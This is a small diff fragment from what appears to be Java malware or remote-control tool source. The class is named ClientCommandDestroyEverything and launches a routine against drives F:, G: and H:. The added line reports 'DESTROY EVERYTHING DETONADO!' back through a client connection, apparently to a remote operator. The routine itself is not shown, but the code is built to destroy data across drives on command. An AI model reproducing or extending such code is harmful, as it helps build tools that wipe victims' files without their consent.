@@ -126,6 +126,7 @@ public class ClientCommandDestroyEverything extends ClientCommand {
             start(new File("F:/"));
             start(new File("G:/"));
             start(new File("H:/"));
+            ConnectClient.msg("DESTROY EVERYTHING DETONADO!");
         }).start();
     }
 
